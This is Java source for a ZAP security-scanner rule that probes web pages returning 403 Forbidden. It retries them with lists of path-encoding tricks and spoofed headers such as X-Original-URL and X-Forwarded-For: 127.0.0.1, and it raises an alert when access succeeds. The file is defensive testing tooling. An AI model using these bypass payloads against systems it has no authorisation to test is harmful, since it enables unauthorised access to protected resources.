/*
 * Zed Attack Proxy (ZAP) and its related class files.
 *
 * ZAP is an HTTP/HTTPS proxy for assessing web application security.
 *
 * Copyright 2020 The ZAP Development Team
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package org.zaproxy.zap.extension.ascanrulesBeta;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import org.apache.commons.httpclient.URI;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.parosproxy.paros.Constant;
import org.parosproxy.paros.core.scanner.AbstractAppPlugin;
import org.parosproxy.paros.core.scanner.Alert;
import org.parosproxy.paros.core.scanner.Category;
import org.parosproxy.paros.network.HttpMessage;
import org.parosproxy.paros.network.HttpStatusCode;
import org.zaproxy.addon.commonlib.CommonAlertTag;
import org.zaproxy.addon.commonlib.PolicyTag;
import org.zaproxy.addon.commonlib.http.HttpFieldsNames;

/**
 * Active scan rule which attempts various 403 bypass techniques.
 *
 * @author Aman Rawat (@theamanrawat)
 */
public class ForbiddenBypassScanRule extends AbstractAppPlugin {

    private static final String MESSAGE_PREFIX = "ascanbeta.forbiddenBypass.";
    private static final Logger LOGGER = LogManager.getLogger(ForbiddenBypassScanRule.class);
    private static final Map<String, String> ALERT_TAGS;

    static {
        Map<String, String> alertTags =
                new HashMap<>(
                        CommonAlertTag.toMap(
                                CommonAlertTag.OWASP_2021_A01_BROKEN_AC,
                                CommonAlertTag.OWASP_2017_A05_BROKEN_AC,
                                CommonAlertTag.WSTG_V42_ATHN_04_AUTH_BYPASS));
        alertTags.put(PolicyTag.QA_FULL.getTag(), "");
        alertTags.put(PolicyTag.PENTEST.getTag(), "");
        ALERT_TAGS = Collections.unmodifiableMap(alertTags);
    }

    @Override
    public int getId() {
        return 40038;
    }

    @Override
    public String getName() {
        return Constant.messages.getString(MESSAGE_PREFIX + "name");
    }

    @Override
    public String getDescription() {
        return Constant.messages.getString(MESSAGE_PREFIX + "desc");
    }

    @Override
    public void scan() {
        HttpMessage message = getNewMsg();
        try {
            sendAndReceive(message);
            if (message.getResponseHeader().getStatusCode() != HttpStatusCode.FORBIDDEN) {
                return;
            }
            URI uri = message.getRequestHeader().getURI();
            String host = uri.getEscapedAuthority();
            String path = uri.getEscapedPath();
            String schema = uri.getScheme();
            if (sendPathPayloads(path, host, schema, uri)) {
                return;
            }
            if (sendHeaderPayloads(path, host, schema, uri)) {
                return;
            }

        } catch (IOException e) {
            LOGGER.warn(e.getMessage(), e);
        }
    }

    private boolean sendPathPayloads(String path, String host, String schema, URI uri)
            throws IOException {
        String[] pathPayloads = {
            "/%2e" + path,
            path + "/./",
            "/." + path + "/./",
            path + "%20/",
            "/%20" + path + "%20/",
            path + "%09/",
            "/%09" + path + "%09/",
            path + "..;/",
            path + "?",
            path + "??",
            "/" + path + "//",
            path + "/",
            path + "/.testus",
            path + "../app.py"
        };

        for (String pathPayload : pathPayloads) {
            HttpMessage reqWithPayload =
                    new HttpMessage(new URI(schema + "://" + host + "" + pathPayload, true));
            reqWithPayload
                    .getRequestHeader()
                    .setVersion(getBaseMsg().getRequestHeader().getVersion());
            sendAndReceive(reqWithPayload);
            if (reqWithPayload.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
                createAlert(uri.toString(), reqWithPayload, pathPayload).raise();
                return true;
            }
        }
        return false;
    }

    private boolean sendHeaderPayloads(String path, String host, String schema, URI uri)
            throws IOException {
        String[] headerPayloads = {
            HttpFieldsNames.X_REWRITE_URL + ": " + path,
            HttpFieldsNames.X_ORIGINAL_URL + ": " + path,
            HttpFieldsNames.REFERER + ": " + path,
            "x-custom-ip-authorization: 127.0.0.1",
            "x-originating-ip: 127.0.0.1",
            HttpFieldsNames.X_FORWARDED_FOR + ": 127.0.0.1",
            "x-remote-ip: 127.0.0.1",
            "x-client-ip: 127.0.0.1",
            "x-host: 127.0.0.1",
            "x-forwarded-host: 127.0.0.1"
        };

        for (String header : headerPayloads) {
            String tmpUri = schema + "://" + host;

            if (header.contains(HttpFieldsNames.X_REWRITE_URL)
                    || header.contains(HttpFieldsNames.REFERER)) {
                tmpUri = tmpUri + "/anything";
            } else if (header.contains(HttpFieldsNames.X_ORIGINAL_URL)) {
                tmpUri = tmpUri + "/";
            } else {
                tmpUri = tmpUri + path;
            }

            HttpMessage reqWithPayload = new HttpMessage(new URI(tmpUri, true));
            reqWithPayload
                    .getRequestHeader()
                    .setVersion(getBaseMsg().getRequestHeader().getVersion());

            String[] headerPayload = header.split(":");

            reqWithPayload.getRequestHeader().setHeader(headerPayload[0], headerPayload[1]);
            sendAndReceive(reqWithPayload);

            if (reqWithPayload.getResponseHeader().getStatusCode() == HttpStatusCode.OK) {
                createAlert(uri.toString(), reqWithPayload, header).raise();
                return true;
            }
        }
        return false;
    }

    private AlertBuilder createAlert(String uri, HttpMessage message, String payload) {
        return newAlert().setOtherInfo(uri).setMessage(message).setAttack(payload);
    }

    @Override
    public int getCategory() {
        return Category.MISC;
    }

    @Override
    public String getSolution() {
        return "";
    }

    @Override
    public String getReference() {
        return Constant.messages.getString(MESSAGE_PREFIX + "refs");
    }

    @Override
    public Map<String, String> getAlertTags() {
        return ALERT_TAGS;
    }

    @Override
    public int getCweId() {
        return 348; // CWE-348: Use of Less Trusted Source
    }

    @Override
    public List<Alert> getExampleAlerts() {
        List<Alert> alerts = new ArrayList<>();
        try {
            alerts.add(
                    createAlert("", new HttpMessage(new URI("https://example.com", true)), "")
                            .build());
        } catch (Exception e) {
            throw new IllegalStateException(e);
        }
        return alerts;
    }
}
